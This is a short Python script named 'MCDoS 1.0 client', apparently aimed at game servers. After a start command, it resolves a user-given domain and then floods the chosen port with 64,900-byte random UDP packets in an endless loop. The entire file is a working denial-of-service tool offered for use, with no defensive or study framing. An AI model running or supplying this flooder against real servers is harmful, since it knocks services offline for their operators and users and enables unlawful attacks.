# MCDoS 1.0 client

import socket, random, time, sys

def Dos():
  host = input('server domain: ')
  ip = socket.gethostbyname(host)
  port = int(input('server port: '))
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  bytes = random._urandom(64900)
  print()
  print('-' * 60)
  print()
  time.sleep(1)
  sent = 0
  while True:
    try:
      s.sendto(bytes, (ip,port))
      sent = sent + 1
      print('Sent %s to %s through port %s' % (sent, host, port))
    except KeyboardInterrupt:
      print('\ninterruption.')
      return


print(open('usage', 'r').read())

while True:
  start = input('>>> ')
  if start.lower().startswith('s'):
    Dos()
  elif start.lower().startswith('q'):
    sys.exit()
  else:
    print('Q for Quit, S for Start')


